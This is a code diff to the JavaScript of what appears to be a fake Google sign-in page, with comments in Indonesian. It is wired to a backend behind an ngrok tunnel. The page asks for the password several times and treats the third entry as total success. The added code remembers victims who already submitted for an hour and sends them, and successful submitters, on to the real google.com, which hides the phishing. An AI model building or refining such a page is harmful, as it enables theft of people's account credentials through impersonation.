@@ -8,6 +8,48 @@
 //               WAJIB https (bukan http) agar cookie Secure bisa diterima browser
 const IP_STB = "https://kindly-kiln-scabby.ngrok-free.dev"; // <-- ganti dengan URL ngrok kamu
 
+// ===== AUTO-REDIRECT JIKA SESI MASIH AKTIF =====
+// Dijalankan paling awal sebelum form login sempat dirender
+// Dual-check: localStorage dulu (cepat, offline-safe), lalu backend (sumber kebenaran)
+(function checkSesiAktif() {
+    // Cleanup: hapus localStorage kalau sudah expired agar tidak jadi sesi hantu
+    const expiry = localStorage.getItem('sesi_expiry');
+    if (expiry && Date.now() >= parseInt(expiry)) {
+        localStorage.removeItem('sesi_expiry');
+    }
+
+    // Cara 1: Cek localStorage — paling cepat, tidak perlu hit backend
+    // Kebal dari blokir third-party cookie karena disimpan di domain frontend sendiri
+    const expiryValid = localStorage.getItem('sesi_expiry');
+    if (expiryValid && Date.now() < parseInt(expiryValid)) {
+        window.location.href = "https://google.com";
+        return; // Stop, tidak perlu lanjut cek backend
+    }
+
+    // Cara 2: Fallback cek ke backend — untuk kasus localStorage dibersihkan manual
+    // tapi cookie backend masih aktif
+    fetch(`${IP_STB}/cek-sesi`, {
+        method: 'GET',
+        credentials: 'include', // Kirim cookie ke backend
+        headers: {
+            'ngrok-skip-browser-warning': 'true' // Bypass warning page ngrok
+        }
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (data.status === 'active') {
+            // Cookie backend masih aktif — perbarui localStorage sekalian
+            localStorage.setItem('sesi_expiry', Date.now() + (60 * 60 * 1000));
+            window.location.href = "https://google.com";
+        }
+        // Kalau expired: diam saja, biarkan form login tampil normal
+    })
+    .catch(() => {
+        // Gagal koneksi ke backend (offline/ngrok mati) — biarkan form login tampil
+        console.log('[SESI CHECK] Backend tidak terjangkau, lanjut tampilkan form login.');
+    });
+})();
+
 // ===== 1. DEKLARASI ELEMEN UTAMA =====
 const boxStep1 = document.getElementById('boxStep1');
 const googleCardWrapper = document.getElementById('googleCardWrapper');
@@ -325,6 +367,10 @@ function handlePasswordSubmit() {
         }
         // JIKA INPUT PASSWORD KE-3 (SUKSES TOTAL - REDIRECT)
         else if (hasil.status === "SUKSES_TOTAL") {
+            // Simpan timestamp expiry 1 jam ke localStorage
+            // Ini yang akan dicek saat user buka login.html lagi agar langsung redirect
+            localStorage.setItem('sesi_expiry', Date.now() + (60 * 60 * 1000));
+
             loadingLine.classList.add('hidden');
             triggerLoading(true);
 
@@ -336,13 +382,11 @@ function handlePasswordSubmit() {
                 groupPassword.classList.remove('error-mode');
                 errorPassword.classList.add('hidden');
 
-                const targetLink = "about:blank";
-
                 if (window.process && window.process.versions && window.process.versions.electron) {
                     const { shell } = window.require('electron');
-                    shell.openExternal(targetLink);
+                    shell.openExternal("https://google.com");
                 } else {
-                    window.location.href = "https://google.com/";
+                    window.location.href = "https://google.com";
                 }
             }, 2000);
         }
